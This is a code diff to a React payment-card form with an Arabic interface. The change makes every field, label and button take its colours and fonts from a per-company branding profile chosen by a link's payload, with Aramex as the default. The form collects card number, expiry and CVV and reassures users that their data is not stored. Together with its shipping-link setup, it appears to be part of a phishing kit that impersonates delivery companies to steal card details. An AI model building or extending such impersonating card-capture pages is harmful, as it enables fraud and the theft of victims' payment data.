@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getCompanyBranding } from "@/lib/companyBranding";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
 import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2, Shield, Lock, Calendar } from "lucide-react";
@@ -36,7 +36,7 @@ const PaymentCardInput = () => {
 
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const branding = getCompanyBranding(serviceKey);
 
   const shippingInfo = linkData?.payload as any;
 
@@ -201,14 +201,28 @@ const PaymentCardInput = () => {
             value={cardName}
             onChange={(e) => setCardName(e.target.value)}
             required
-            className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
+            className="h-12 text-base transition-colors"
+            style={{
+              borderWidth: '2px',
+              borderColor: branding.colors.border,
+              backgroundColor: '#FFFFFF',
+              borderRadius: branding.borderRadius.md,
+              fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+            }}
             placeholder="أدخل الاسم كما هو مكتوب على البطاقة"
           />
         </div>
 
         {/* Card Number */}
         <div>
-          <Label htmlFor="cardNumber" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+          <Label
+            htmlFor="cardNumber"
+            className="flex items-center gap-2 mb-2 text-sm font-medium"
+            style={{
+              color: branding.colors.text,
+              fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+            }}
+          >
             <CreditCard className="w-4 h-4" />
             رقم البطاقة *
           </Label>
@@ -218,7 +232,14 @@ const PaymentCardInput = () => {
               value={cardNumber}
               onChange={(e) => handleCardNumberChange(e.target.value)}
               required
-              className="h-12 text-base border-2 focus:border-blue-500 transition-colors pl-20"
+              className="h-12 text-base transition-colors pl-20"
+              style={{
+                borderWidth: '2px',
+                borderColor: branding.colors.border,
+                backgroundColor: '#FFFFFF',
+                borderRadius: branding.borderRadius.md,
+                fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+              }}
               placeholder="1234 5678 9012 3456"
               maxLength={19}
             />
@@ -244,12 +265,28 @@ const PaymentCardInput = () => {
         {/* Expiry and CVV */}
         <div className="grid grid-cols-3 gap-4">
           <div className="col-span-1">
-            <Label htmlFor="expiryMonth" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+            <Label
+              htmlFor="expiryMonth"
+              className="flex items-center gap-2 mb-2 text-sm font-medium"
+              style={{
+                color: branding.colors.text,
+                fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+              }}
+            >
               <Calendar className="w-4 h-4" />
               شهر *
             </Label>
             <Select value={expiryMonth} onValueChange={setExpiryMonth}>
-              <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
+              <SelectTrigger
+                className="h-12 text-base transition-colors"
+                style={{
+                  borderWidth: '2px',
+                  borderColor: branding.colors.border,
+                  backgroundColor: '#FFFFFF',
+                  borderRadius: branding.borderRadius.md,
+                  fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+                }}
+              >
                 <SelectValue placeholder="شهر" />
               </SelectTrigger>
               <SelectContent className="bg-background z-50">
@@ -263,12 +300,28 @@ const PaymentCardInput = () => {
           </div>
 
           <div className="col-span-1">
-            <Label htmlFor="expiryYear" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+            <Label
+              htmlFor="expiryYear"
+              className="flex items-center gap-2 mb-2 text-sm font-medium"
+              style={{
+                color: branding.colors.text,
+                fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+              }}
+            >
               <Calendar className="w-4 h-4" />
               سنة *
             </Label>
             <Select value={expiryYear} onValueChange={setExpiryYear}>
-              <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
+              <SelectTrigger
+                className="h-12 text-base transition-colors"
+                style={{
+                  borderWidth: '2px',
+                  borderColor: branding.colors.border,
+                  backgroundColor: '#FFFFFF',
+                  borderRadius: branding.borderRadius.md,
+                  fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+                }}
+              >
                 <SelectValue placeholder="سنة" />
               </SelectTrigger>
               <SelectContent className="bg-background z-50">
@@ -282,7 +335,14 @@ const PaymentCardInput = () => {
           </div>
 
           <div className="col-span-1">
-            <Label htmlFor="cvv" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+            <Label
+              htmlFor="cvv"
+              className="flex items-center gap-2 mb-2 text-sm font-medium"
+              style={{
+                color: branding.colors.text,
+                fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+              }}
+            >
               <Lock className="w-4 h-4" />
               CVV *
             </Label>
@@ -291,7 +351,14 @@ const PaymentCardInput = () => {
               value={cvv}
               onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
               required
-              className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
+              className="h-12 text-base transition-colors"
+              style={{
+                borderWidth: '2px',
+                borderColor: branding.colors.border,
+                backgroundColor: '#FFFFFF',
+                borderRadius: branding.borderRadius.md,
+                fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+              }}
               placeholder="123"
               maxLength={4}
               type="password"
@@ -300,12 +367,29 @@ const PaymentCardInput = () => {
         </div>
 
         {/* Security Info */}
-        <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
+        <div
+          className="mt-6 p-4 rounded-lg"
+          style={{
+            backgroundColor: branding.colors.surface,
+            borderRadius: branding.borderRadius.md
+          }}
+        >
           <div className="flex items-start gap-3">
-            <Lock className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
+            <Lock className="w-5 h-5 mt-0.5" style={{ color: branding.colors.secondary }} />
             <div>
-              <h4 className="font-semibold text-sm mb-1" style={{ color: uaeColors.accent }}>محمي بتشفير SSL</h4>
-              <p className="text-xs text-gray-600">
+              <h4
+                className="font-semibold text-sm mb-1"
+                style={{
+                  color: branding.colors.text,
+                  fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+                }}
+              >
+                محمي بتشفير SSL
+              </h4>
+              <p
+                className="text-xs"
+                style={{ color: branding.colors.textLight }}
+              >
                 جميع المعلومات مُشفرة ومحمية. لا نقوم بتخزين بيانات بطاقتك.
               </p>
             </div>
@@ -316,8 +400,13 @@ const PaymentCardInput = () => {
         <Button
           type="submit"
           size="lg"
-          className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
-          style={{ backgroundColor: uaeColors.primary }}
+          className="w-full h-14 text-lg font-bold mt-6 transition-all hover:opacity-90"
+          style={{
+            background: branding.gradients.primary,
+            borderRadius: branding.borderRadius.lg,
+            fontFamily: branding.fonts.primaryAr || branding.fonts.primary,
+            boxShadow: branding.shadows.md
+          }}
           disabled={isSubmitting || !cardValid}
         >
           {isSubmitting ? (
@@ -333,7 +422,13 @@ const PaymentCardInput = () => {
           )}
         </Button>
 
-        <p className="text-xs text-center text-gray-500 mt-4">
+        <p
+          className="text-xs text-center mt-4"
+          style={{
+            color: branding.colors.textLight,
+            fontFamily: branding.fonts.primaryAr || branding.fonts.primary
+          }}
+        >
           بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
         </p>
       </form>
